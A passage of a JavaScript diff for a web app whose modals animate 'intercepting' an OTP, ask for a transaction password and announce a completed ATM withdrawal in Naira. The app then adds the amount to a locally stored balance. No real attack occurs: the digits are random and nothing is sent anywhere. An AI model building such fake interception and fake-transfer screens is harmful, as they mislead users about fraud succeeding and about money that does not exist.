+        '⚡ Decrypting OTP signals...',
+        '🎯 Breaking encryption keys...',
+        '📱 Extracting OTP code...',
+        '✅ OTP successfully intercepted!'
+    ];
+
+    let currentDigit = 0;
+    let messageIndex = 0;
+    let progress = 75; // Starting from 75%
+
+    progressFill.style.width = progress + '%';
+
+    const otpInterval = setInterval(() => {
+        if (currentDigit < digits.length) {
+            const digitElement = document.getElementById(digits[currentDigit]);
+            let digitValue = 0;
+            
+            // Fast cycling animation for current digit using RAF
+            let rafId;
+            let lastTime = 0;
+            function animateOtpDigit(timestamp) {
+                if (timestamp - lastTime > 80) { // Throttle to match original timing
+                    digitValue = (digitValue + 1) % 10;
+                    digitElement.textContent = digitValue;
+                    digitElement.style.color = '#ff4757';
+                    digitElement.style.textShadow = '0 0 10px #ff4757';
+                    digitElement.style.transform = 'scale(1.2)';
+                    lastTime = timestamp;
+                }
+                rafId = requestAnimationFrame(animateOtpDigit);
+            }
+            rafId = requestAnimationFrame(animateOtpDigit);
+
+            // Stop cycling after 2.5 seconds and lock in final digit
+            setTimeout(() => {
+                cancelAnimationFrame(rafId);
+                const finalDigit = Math.floor(Math.random() * 10);
+                digitElement.textContent = finalDigit;
+                digitElement.style.color = '#4CAF50';
+                digitElement.style.textShadow = '0 0 10px #4CAF50';
+                digitElement.style.transform = 'scale(1)';
+                currentDigit++;
+                
+                progress = 75 + (currentDigit / digits.length) * 15; // 75% to 90%
+                progressFill.style.width = progress + '%';
+            }, 2500);
+
+        } else {
+            clearInterval(otpInterval);
+            statusText.textContent = statusMessages[5];
+            progressFill.style.width = '90%';
+            
+            setTimeout(() => {
+                modal.remove();
+                showAtmPasswordModal(amount);
+            }, 1500);
+        }
+
+        // Update status messages
+        if (messageIndex < statusMessages.length - 1) {
+            setTimeout(() => {
+                statusText.textContent = statusMessages[messageIndex];
+                messageIndex++;
+            }, messageIndex * 800);
+        }
+    }, 3000);
+}
+
+// Step 4: Password Input/Creation Modal
+function showAtmPasswordModal(amount) {
+    const modal = document.createElement('div');
+    modal.className = 'modal';
+    modal.innerHTML = `
+        <div class="modal-content processing-modal">
+            <h3>🔑 Transaction Password Required</h3>
+            <div class="password-container">
+                <div class="password-prompt">
+                    <p>Enter transaction password or create new one:</p>
+                </div>
+                <div class="password-input-section">
+                    <input type="password" id="atmTransactionPassword" placeholder="Enter password" maxlength="6" />
+                    <div class="password-actions">
+                        <button id="usePasswordBtn" class="password-btn">Use Password</button>
+                        <button id="createPasswordBtn" class="password-btn">Create New</button>
+                    </div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" style="width: 90%;"></div>
+                </div>
+            </div>
+        </div>
+    `;
+
+    document.body.appendChild(modal);
+    modal.style.display = 'block';
+
+    // Handle password actions
+    document.getElementById('usePasswordBtn').addEventListener('click', () => {
+        const password = document.getElementById('atmTransactionPassword').value;
+        if (password.length >= 4) {
+            modal.remove();
+            showAtmFinalAnimation(amount);
+        } else {
+            showNotification('Password must be at least 4 characters', 'error');
+        }
+    });
+
+    document.getElementById('createPasswordBtn').addEventListener('click', () => {
+        const password = Math.random().toString(36).substring(2, 8).toUpperCase();
+        document.getElementById('atmTransactionPassword').value = password;
+        setTimeout(() => {
+            modal.remove();
+            showAtmFinalAnimation(amount);
+        }, 1000);
+    });
+}
+
+// Step 5: Final Animation before amount enters dashboard
+function showAtmFinalAnimation(amount) {
+    const modal = document.createElement('div');
+    modal.className = 'modal';
+    modal.innerHTML = `
+        <div class="modal-content processing-modal">
+            <h3>💰 Finalizing Transaction</h3>
+            <div class="final-animation">
+                <div class="transaction-steps">
+                    <div class="final-step active">🏦 Connecting to bank servers...</div>
+                    <div class="final-step">💳 Authorizing withdrawal...</div>
+                    <div class="final-step">💰 Processing transfer...</div>
+                    <div class="final-step">✅ Transfer completed!</div>
+                </div>
+                <div class="amount-display">
+                    <div class="amount-text">₦${amount.toLocaleString()}</div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="finalProgressFill"></div>
+                </div>
+            </div>
+        </div>
+    `;
+
+    document.body.appendChild(modal);
+    modal.style.display = 'block';
+
+    // Animate final steps
+    const steps = modal.querySelectorAll('.final-step');
+    const progressFill = modal.querySelector('#finalProgressFill');
+    let currentStep = 0;
+
+    progressFill.style.width = '90%';
 
     const interval = setInterval(() => {
         if (currentStep < steps.length) {
             steps.forEach(step => step.classList.remove('active'));
             steps[currentStep].classList.add('active');
             
-            const progress = ((currentStep + 1) / steps.length) * 100;
+            const progress = 90 + ((currentStep + 1) / steps.length) * 10; // 90% to 100%
             progressFill.style.width = progress + '%';
-            
             currentStep++;
         } else {
             clearInterval(interval);
-            
             setTimeout(() => {
                 modal.remove();
                 
                 // Update balance and show success
-                userSession.balance += amount;
-                saveUserSession(userSession);
-                updateBalance();
+                if (typeof userSession !== 'undefined') {
+                    userSession.balance += amount;
+                    saveUserSession(userSession);
+                    updateBalance();
+                }
 
                 showNotification(`💰 Successfully withdrew ₦${amount.toLocaleString()} from ATM!`, 'success');
                 
@@ -10691,7 +11384,7 @@ function showAtmProcessingModal(amount) {
                 showAtmReceipt(amount);
             }, 1000);
         }
-    }, 3000);
+    }, 2500);
 }
 
 function showAtmReceipt(amount) {
